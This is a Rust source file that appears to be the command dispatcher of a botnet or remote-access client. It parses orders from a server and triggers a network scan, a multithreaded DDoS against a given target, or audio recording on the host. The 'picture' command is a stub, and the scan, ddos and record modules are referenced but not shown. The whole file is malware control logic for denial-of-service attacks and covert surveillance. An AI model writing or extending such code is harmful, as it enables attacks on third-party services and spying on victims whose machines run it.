use std::thread;

mod scan;
mod ddos;
mod picture;
mod record;

pub(crate) fn ordre_du_srv(mut ordre: String) {
    let args: Vec<&str> = ordre.split_whitespace().collect();

    match args.get(0) {
        Some(&"scan") => {
            println!("Lancement du scan réseau");
            let t = thread::spawn(move || { scan::scan(scan::find_net()); });
            t.join().expect("Le thread de scan a échoué");
        },
        Some(&"ddos") if (6..=15).contains(&args.get(1).map_or(0, |s| s.len())) => {
            if let Ok(number) = args.get(2).unwrap_or(&"").parse::<i32>() {
                println!("Lancement de l'attaque ddos avec {} threads", number);
                let mut handles = Vec::new();

                for _ in 0..number {
                    let target = args[1].to_string();
                    let handle = thread::spawn(move || { ddos::ping(target.clone()); });
                    handles.push(handle);
                }

                for handle in handles {
                    handle.join().expect("Un thread de ddos a échoué");
                }
            } else {
                println!("Erreur : le nombre de threads n'est pas valide");
            }
        },
        Some(&"picture") => {
            println!("Cette option est en cours de développement :(");
        },
        Some(&"record") => {
            println!("Lancement de l'enregistrement audio");
            let t = thread::spawn(move || { record::record(); });
            t.join().expect("Le thread d'enregistrement a échoué");
        },
        _ => {
            println!("Commande non reconnue ou argument manquant");
        }
    }
}
